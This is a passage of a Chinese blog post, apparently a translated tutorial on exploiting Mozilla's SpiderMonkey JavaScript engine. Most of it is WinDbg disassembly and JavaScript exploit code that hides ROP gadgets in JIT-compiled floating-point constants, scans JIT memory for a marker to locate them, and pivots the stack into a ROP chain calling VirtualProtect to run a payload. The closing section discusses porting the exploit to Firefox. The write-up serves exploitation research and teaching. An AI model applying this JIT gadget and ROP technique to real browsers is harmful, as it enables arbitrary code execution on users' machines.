Void</span><br><span class="line"></span><br><span class="line">0:000&gt; dt JSJitInfo 0x000001dc`e1993258</span><br><span class="line">   +0x000 getter           : 0x0000015d`e28a1bf0     bool  +15de28a1bf0</span><br><span class="line">   +0x000 setter           : 0x0000015d`e28a1bf0     bool  +15de28a1bf0</span><br><span class="line">   +0x000 method           : 0x0000015d`e28a1bf0     bool  +15de28a1bf0</span><br><span class="line">   +0x000 staticMethod     : 0x0000015d`e28a1bf0     bool  +15de28a1bf0</span><br><span class="line">   +0x000 ignoresReturnValueMethod : 0x0000015d`e28a1bf0     bool  +15de28a1bf0</span><br><span class="line"></span><br><span class="line">0:000&gt; u 0x0000015d`e28a1bf0 l200</span><br><span class="line">[...]</span><br><span class="line">0000015d`e28a2569 49bb595a41584159c390 mov r11,90C3594158415A59h</span><br><span class="line">0000015d`e28a2573 4c895dc8        mov     qword ptr [rbp-38h],r11</span><br><span class="line">0000015d`e28a2577 49bb4887e2909090eb06 mov r11,6EB909090E28748h</span><br><span class="line">0000015d`e28a2581 4c895dc0        mov     qword ptr [rbp-40h],r11</span><br><span class="line">0000015d`e28a2585 49bb488b24249090eb06 mov r11,6EB909024248B48h</span><br><span class="line">0000015d`e28a258f 4c895db8        mov     qword ptr [rbp-48h],r11</span><br><span class="line">0000015d`e28a2593 49bb488b642438c39090 mov r11,9090C33824648B48h</span><br><span class="line">0000015d`e28a259d 4c895db0        mov     qword ptr [rbp-50h],r11</span><br></pre></td></tr></table></figure>
<p>反汇编  gadget，允许我们控制 kernel32 的前四个参数！VirtualProtect ..：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 0000015d`e28a2569+2</span><br><span class="line">0000015d`e28a256b 59              pop     rcx</span><br><span class="line">0000015d`e28a256c 5a              pop     rdx</span><br><span class="line">0000015d`e28a256d 4158            pop     r8</span><br><span class="line">0000015d`e28a256f 4159            pop     r9</span><br><span class="line">0000015d`e28a2571 c3              ret</span><br></pre></td></tr></table></figure>
<p>和这是第三部分的 stack-pivot:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 0000015d`e28a2577+2</span><br><span class="line">0000015d`e28a2579 4887e2          xchg    rsp,rdx</span><br><span class="line">0000015d`e28a257c 90              nop</span><br><span class="line">0000015d`e28a257d 90              nop</span><br><span class="line">0000015d`e28a257e 90              nop</span><br><span class="line">0000015d`e28a257f eb06            jmp     0000015d`e28a2587</span><br><span class="line"></span><br><span class="line">0:000&gt; u 0000015d`e28a2587</span><br><span class="line">0000015d`e28a2587 488b2424        mov     rsp,qword ptr [rsp]</span><br><span class="line">0000015d`e28a258b 90              nop</span><br><span class="line">0000015d`e28a258c 90              nop</span><br><span class="line">0000015d`e28a258d eb06            jmp     0000015d`e28a2595</span><br><span class="line"></span><br><span class="line">0:000&gt; u 0000015d`e28a2595</span><br><span class="line">0000015d`e28a2595 488b642438      mov     rsp,qword ptr [rsp+38h]</span><br><span class="line">0000015d`e28a259a c3              ret</span><br></pre></td></tr></table></figure>
<p>是不是很酷？ 为了能够轻松扫描内存中的 gadget，我甚至可以设置 ascii 常量。 一旦找到它，我就知道其余的  gadgets 应该跟随这六个字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Bring your own gadgetz boiz!</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">const Magic = &apos;0vercl0k&apos;.split(&apos;&apos;).map(c =&gt; c.charCodeAt(0));</span><br><span class="line">const BringYourOwnGadgets = function () &#123;</span><br><span class="line"></span><br><span class="line">    const Magic = 2.1091131882779924e+208;</span><br><span class="line">    const PopRegisters = -6.380930795567661e-228;</span><br><span class="line">    const Pivot0 = 2.4879826032820723e-275;</span><br><span class="line">    const Pivot1 = 2.487982018260472e-275;</span><br><span class="line">    const Pivot2 = -6.910095487116115e-229;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Force JITing of the gadgets</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">for(let Idx = 0; Idx &lt; 12; Idx++) &#123;</span><br><span class="line">    BringYourOwnGadgets();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Retrieve addresses of the gadgets</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">const BringYourOwnGadgetsAddress = Pwn.AddrOf(BringYourOwnGadgets);</span><br><span class="line">const JsScriptAddress = Pwn.ReadPtr(</span><br><span class="line">    Add(BringYourOwnGadgetsAddress, 0x30)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">const JittedAddress = Pwn.ReadPtr(JsScriptAddress);</span><br><span class="line">let JitPageStart = alignDownPage(JittedAddress);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Scan the JIT page, pages by pages until finding the magic value. Our</span><br><span class="line">// gadgets follow it.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">let MagicAddress = 0;</span><br><span class="line">let FoundMagic = false;</span><br><span class="line">for(let PageIdx = 0; PageIdx &lt; 3 &amp;&amp; !FoundMagic; PageIdx++) &#123;</span><br><span class="line">    const JitPageContent = Pwn.Read(JitPageStart, 0x1000);</span><br><span class="line">    for(let ContentIdx = 0; ContentIdx &lt; JitPageContent.byteLength; ContentIdx++) &#123;</span><br><span class="line">        const Needle = JitPageContent.subarray(</span><br><span class="line">            ContentIdx, ContentIdx + Magic.length</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if(ArrayCmp(Needle, Magic)) &#123;</span><br><span class="line"></span><br><span class="line">            //</span><br><span class="line">            // If we find the magic value, then we compute its address, and we getta outta here!</span><br><span class="line">            //</span><br><span class="line"></span><br><span class="line">            MagicAddress = Add(JitPageStart, ContentIdx);</span><br><span class="line">            FoundMagic = true;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JitPageStart = Add(JitPageStart, 0x1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const PopRcxRdxR8R9Address = Add(MagicAddress, 0x8 + 4 + 2);</span><br><span class="line">const RetAddress = Add(PopRcxRdxR8R9Address, 6);</span><br><span class="line">const PivotAddress = Add(PopRcxRdxR8R9Address, 0x8 + 4 + 2);</span><br><span class="line"></span><br><span class="line">print(&apos;[+] PopRcxRdxR8R9 is @ &apos; + PopRcxRdxR8R9Address.toString(16));</span><br><span class="line">print(&apos;[+] Pivot is @ &apos; + PivotAddress.toString(16));</span><br><span class="line">print(&apos;[+] Ret is @ &apos; + RetAddress.toString(16));</span><br></pre></td></tr></table></figure>
<p>这样可以解决我们对 ntdll 模块的依赖问题，同时也为我们提供了继续进程的正确方向，因为我们可以轻松地保存/恢复。 mov rsp，qword ptr [rsp + 38h] 允许我们直接写入 TypedArray 的后备缓冲区。我们一次转到我们的 ROP链，它调用 kernel32！VirtualProtect 并将执行调度到我们的 payload 位置。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190822162115-cf701c2a-c4b5-1.gif" alt=""></p>
<h3 id="评估-1"><a href="#评估-1" class="headerlink" title="评估"></a>评估</h3><p>写这个很有趣。 一系列新的挑战，尽管我并没有预见到其中的一小部分。 这也是为什么实际动手真的很重要的原因。 它可能看起来很容易，但你真的做过。 特别是在处理如此大的工程时，你无法预测一切，因此往往会发生意想不到的事情。<br>在这个阶段，我想尝试解决和改进三件事：</p>
<ul>
<li>该 EXP 仍然无法继续执行。 弹出计算器后 payload 退出，因为我们会在返回时崩溃。</li>
<li>它仅针对 JavaScript shell。 我们所做的所有努力使得漏洞利用程序更少依赖于这个版本的 js.exe 应该有助于使漏洞利用在 Firefox 中。</li>
<li>我喜欢 JIT 代码重用技术。 虽然它很好，但是我仍然需要动态解决 kernel32！VirtualProtect 的地址，这有点烦人。这比较烦，因为 payload 也会执行相同的工作：在运行时解析所有依赖项。但是，如果我们可以让 payload 自己解决这个问题呢？如果我们尽可能的使用 JIT代码重用技术 ，而不是制造一些 gadgets，我们将整个 payload 并到JITed 常量中会怎么样？如果可以的话，进程继续运行可能是非常重要的。 payload 应该返回，它应该正常工作（tm）。</li>
</ul>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/mePic.jpg&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div class="tags"><a href="/tags/漏洞利用/">漏洞利用</a></div><div class="post-nav"><a class="pre" href="/2020/11/15/spiderMonkey-漏洞利用简介3/">spiderMonkey 漏洞利用简介3</a><a class="next" href="/2020/11/15/spiderMonkey-漏洞利用简介/">spiderMonkey 漏洞利用简介</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'o3qEIvAEzJfA0jPzjvyVeUwo-gzGzoHsz',
  appKey:'VBV3VN2vtqwbGqHGFeNL86iw',
  placeholder:'thanks for you read',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="https://f01965.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE / 2018</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日志/">日志</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/GC/" style="font-size: 15px;">GC</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/CTF-web/" style="font-size: 15px;">CTF-web</a> <a href="/tags/漏洞利用-固件/" style="font-size: 15px;">漏洞利用 固件</a> <a href="/tags/技术分享/" style="font-size: 15px;">技术分享</a> <a href="/tags/机器学习框架/" style="font-size: 15px;">机器学习框架</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/技术分享-固件/" style="font-size: 15px;">技术分享 固件</a> <a href="/tags/Mircosoft/" style="font-size: 15px;">Mircosoft</a> <a href="/tags/固件/" style="font-size: 15px;">固件</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/02/18/fortigate/">fortigate</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-漏洞利用简介3/">spiderMonkey 漏洞利用简介3</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-漏洞利用简介2/">spiderMonkey 漏洞利用简介2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/spiderMonkey-漏洞利用简介/">spiderMonkey 漏洞利用简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/27/X86-ShellCode-2/">X86-ShellCode编写2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/27/X86-ShellCode-1/">X86-ShellCode编写1</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/CVE-2017-17215-拓展/">CVE-2017-17215 拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/CVE-2017-17215/">CVE-2017-17215</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/18/Cisco-IOS-分析/">Cisco-IOS 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/28/Chrome-沙盒逃逸/">Chrome 沙盒逃逸</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://yan-1-20.github.io/about/" title="Asprose" target="_blank">Asprose</a><ul></ul><a href="https://www.lucifaer.com/" title="Lucifaer" target="_blank">Lucifaer</a><ul></ul><a href="http://drac0nids.top/" title="Drac0nids" target="_blank">Drac0nids</a><ul></ul><a href="http://balis0ng.com/" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://da7uran0ir.github.io/" title="Da7ura_n0ir" target="_blank">Da7ura_n0ir</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"> Dad ， I will always love you.</div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" color="255,0,0" opacity="0.7" zIndex="-1" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>